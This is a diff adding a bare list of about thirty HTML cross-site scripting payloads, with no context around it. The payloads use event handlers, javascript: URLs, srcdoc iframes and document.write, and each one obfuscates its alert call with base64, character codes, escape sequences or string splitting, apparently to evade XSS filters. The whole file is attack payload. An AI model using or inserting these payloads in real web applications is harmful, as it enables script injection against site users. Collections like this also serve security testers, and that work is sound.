@@ -1,0 +1,32 @@
+```html
+<img src=x onerror=setTimeout(atob('YWxlcnQoMSk='),0)>
+<svg onload=eval('\u0061lert(1)')>
+<meta http-equiv="refresh" content="0;url=javascript:window['al'+'ert'](1)">
+<iframe srcdoc="<svg onload=window['al'+'ert']('XSS')>"></iframe>
+<object data="javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></object>
+<details open ontoggle=Function('al'+'\u0065rt(1)')()></details>
+<marquee onstart=window['\x61\x6c\x65\x72\x74'](1)></marquee>
+<video><source onerror=eval('al'+'\u0065rt(1)')></video>
+<img src=# onerror=window['\x61\x6c\x65\x72\x74']('XSS')>
+<svg><desc onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></desc></svg>
+<iframe srcdoc='<meta http-equiv="refresh" content="0;url=javascript:al\u0065rt(1)">'></iframe>
+<script>document.write('<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>')</script>
+<details open ontoggle=eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,40,49,41))></details>
+<svg onload=window['\x61\x6c\x65\x72\x74'](1)></svg>
+<object data="javascript:setTimeout('al'+'ert(1)',0)"></object>
+<marquee onstart=eval('al'+'\u0065rt(1)')></marquee>
+<video><source onerror=Function('al'+'\u0065rt(1)')()></video>
+<img src=# onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<svg><desc onload=window['al'+'ert']('XSS')></desc></svg>
+<iframe srcdoc='<meta http-equiv="refresh" content="0;url=javascript:eval(atob("YWxlcnQoMSk="))">'></iframe>
+<script>document.write('<img src=x onerror=setTimeout(atob("YWxlcnQoMSk="),0)>')</script>
+<details open ontoggle=window['al'+'ert']('XSS')></details>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>
+<object data="javascript:window['al'+'ert']('XSS')"></object>
+<marquee onstart=setTimeout('al'+'ert(1)',0)></marquee>
+<video><source onerror=window['al'+'ert'](1)></video>
+<img src=# onerror=Function('al'+'\u0065rt(1)')()>
+<svg><desc onload=eval(atob('YWxlcnQoMSk='))></desc></svg>
+<iframe srcdoc='<meta http-equiv="refresh" content="0;url=javascript:window["al"+"ert"](1)">'></iframe>
+<script>document.write('<img src=x onerror=window["al"+"ert"](1)>')</script>
+```
